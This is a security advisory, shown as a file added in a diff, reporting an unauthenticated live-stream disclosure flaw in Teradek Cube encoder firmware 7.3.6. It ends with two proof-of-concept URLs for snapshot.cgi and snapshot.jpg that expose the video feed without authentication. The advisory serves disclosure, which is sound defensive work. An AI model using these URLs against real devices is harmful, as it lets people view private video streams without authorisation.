@@ -1,0 +1,37 @@
+
+Teradek Cube 7.3.6 (snapshot.cgi) Stream Disclosure
+
+
+Vendor: Teradek, LLC
+Product web page: https://www.teradek.com
+Affected version: Firmware Version: 7.3.6 (build 26850)
+                  Hardware Version: 1.5
+                  Teradek Firmware Version 7.3.15
+
+
+Summary: Cube packs world-class video quality into a rugged, portable
+chassis for quick IP video deployments at any location. Each encoder
+and decoder includes HDMI and 3G-SDI I/O, Ethernet / WiFI connectivity,
+and full duplex IFB.
+
+Desc: Cube suffers from an unauthenticated and unauthorized live stream
+disclosure when snapshot.cgi script is called.
+
+Tested on: lighttpd/1.4.31
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2018-5463
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5463.php
+
+
+02.03.2018
+
+--
+
+
+http://127.0.0.1:8089/cgi-bin/snapshot.cgi  <-- Generate new and view (redirects to /snapshot.jpg)
+http://127.0.0.1:8089/snapshot.jpg          <-- View stored
